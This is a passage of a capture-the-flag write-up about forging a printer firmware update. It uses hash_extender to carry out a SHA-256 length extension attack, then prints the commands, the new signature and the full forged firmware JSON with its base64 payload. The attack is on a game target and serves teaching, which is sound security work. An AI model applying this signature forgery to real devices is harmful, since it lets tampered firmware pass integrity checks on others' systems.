</div>
<p>We now have an executable called <code class="docutils literal notranslate"><span class="pre">hash_extender</span></code>. To work in a more ordered envirnment, you should copy it into the same directory of the two zipfiles.</p>
<p>Now that <strong>hash_extender</strong> is ready to work, we can start the hijacking process. This is what you will need.</p>
<ol class="simple">
<li><p>hash_extender script</p></li>
<li><p>Original zipfile</p></li>
<li><p>Edited zipfile</p></li>
<li><p>Original <code class="docutils literal notranslate"><span class="pre">firmware-export.json</span></code> file</p></li>
</ol>
<p>Hash Extender can be used to append a new string (or file!) to the original one. It is able to process the original signature, and generature a new one, which is still valid, even with our modified file appended! <br>
We are very lucky, because the troll said the the printer only processes the last file inserted if more files in the same format are provided. It’s perfect for our append!</p>
<p>Run <code class="docutils literal notranslate"><span class="pre">hash_extender</span></code> with these parameters</p>
<ul class="simple">
<li><p><strong>–file firmware.zip</strong> | This is the original firmware.zip</p></li>
<li><p><strong>-s 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97</strong> | The signature from the original .json</p></li>
<li><p><strong>-l 16</strong> | Secret lenght</p></li>
<li><p><strong>–appendfile copy.zip</strong> | Our modified firmware (zipped!)</p></li>
<li><p><strong>–out-file output.hex</strong> | The output file (by default it is is hexacedimal. That’s perfect for us.)</p></li>
<li><p><strong>-f sha256</strong> | Hash type</p></li>
</ul>
<div class="admonition-a-little-fun-fact admonition">
<p class="admonition-title">A Little Fun Fact</p>
<p>When we starded this challenge in the morning, the <code class="docutils literal notranslate"><span class="pre">--appendfile</span></code> argument didn’t exist! You could only append strings. We had to convert to hex, print and run the command for every attempt. In the evening, while we were trying to add our personal <code class="docutils literal notranslate"><span class="pre">--append-file</span></code> argument, we checked the git of the tool again, and the <code class="docutils literal notranslate"><span class="pre">--appendfile</span></code> argument was already there! Someone updated the code a few hours after we originally downloaded it :) <br>
Now, back to the challenge!</p>
</div>
<p>Let’s do this.</p>
<div class="highlight-Shell notranslate"><div class="highlight"><pre><span></span>$ ./hash_extender --file firmware.zip -s 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 -l <span class="m">16</span> --appendfile copy.zip --out-file output.hex -f sha256

Type: sha256
Secret length: <span class="m">16</span>
New signature: 9ae9d5b9301b8f544418627e197c28dd771605c187cc6a213bb1451f8f4b43f1
New string:
</pre></div>
</div>
<p>Save the signature. The new string is in <code class="docutils literal notranslate"><span class="pre">output.hex</span></code> <br>
Now we have to convert <code class="docutils literal notranslate"><span class="pre">output.hex</span></code> to a binary file, because it is in reality a zipfile.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ xxd -r -p output.hex output.zip
</pre></div>
</div>
<p>We’re almost done. The last step is to convert this zip file to a <strong>base64-encoded</strong> string.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">base64</span> <span class="n">output</span><span class="o">.</span><span class="n">zip</span> <span class="o">|</span> <span class="n">tr</span> <span class="o">-</span><span class="n">d</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">&gt;</span> <span class="n">newdata</span><span class="o">.</span><span class="n">zip</span><span class="o">.</span><span class="n">b64</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Since <code class="docutils literal notranslate"><span class="pre">base64</span></code> outputs the file with line endings to make the file more human-readable, but we have to get a single line, so <code class="docutils literal notranslate"><span class="pre">tr</span> <span class="pre">-d</span> <span class="pre">'\n'</span></code> was used to remove line endings and got the single line we needed.</p>
</div>
<p>Now <code class="docutils literal notranslate"><span class="pre">newdata.zip.b64</span></code> contains the base64 encoded firmware. Open it and copy it’s content. <br></p>
</div>
<div class="section" id="firmware-update-upload-it">
<h2>Firmware: Update&amp;Upload it!<a class="headerlink" href="#firmware-update-upload-it" title="Permalink to this headline">¶</a></h2>
<p>Open a copy of <code class="docutils literal notranslate"><span class="pre">firmware-export.json</span></code> and update it with our new strings.</p>
<ul class="simple">
<li><p><strong>signature</strong> –&gt; the one you saved after executing <code class="docutils literal notranslate"><span class="pre">hash_extender</span></code></p></li>
<li><p><strong>firmware</strong> –&gt; content of <code class="docutils literal notranslate"><span class="pre">newdata.zip.b64</span></code></p></li>
</ul>
<p>And this is the new .json</p>
<div class="highlight-Json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span><span class="nt">&quot;firmware&quot;</span><span class="p">:</span><span class="s2">&quot;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&quot;</span><span class="p">,</span><span class="nt">&quot;signature&quot;</span><span class="p">:</span><span class="s2">&quot;9ae9d5b9301b8f544418627e197c28dd771605c187cc6a213bb1451f8f4b43f1&quot;</span><span class="p">,</span><span class="nt">&quot;secret_length&quot;</span><span class="p">:</span><span class="mi">16</span><span class="p">,</span><span class="nt">&quot;algorithm&quot;</span><span class="p">:</span><span class="s2">&quot;SHA256&quot;</span><span class="p">}</span>
</pre></div>
</div>
<p>Now head to https://printer.kringlecastle.com/incoming/usjhsyehdgsttey53 (or whatever file name you inserted!). <br>
Download the file and open it.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Documents queued for printing
=============================

Biggering.pdf
Size Chart from https://clothing.north.pole/shop/items/TheBigMansCoat.pdf
LowEarthOrbitFreqUsage.txt
Best Winter Songs Ever List.doc
Win People and Influence Friends.pdf
Q4 Game Floor Earnings.xlsx
Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml
Troll_Pay_Chart.xlsx
</pre></div>
</div>
<p>The filename we were searching for is <code class="docutils literal notranslate"><span class="pre">Troll_Pay_Chart.xlsx</span></code> <br>
This challenge is done. Thank you for reading.</p>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            kernelName: "python3",
            path: "./."
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'python3'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        
    <a class='left-prev' id="prev-link" href="objective7.html" title="previous page">7. Printer Exploitation</a>
    <a class='right-next' id="next-link" href="objective8.html" title="next page">8. Kerberoasting</a>

    </div>
    <footer class="footer mt-5 mt-md-0">
    <div class="container">
      <p>
        
          By Dani & Max<br/>
        
            &copy; Copyright 2021.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>

    
  <script src="_static/js/index.3da636dd464baa7582d2.js"></script>


    
  </body>
</html>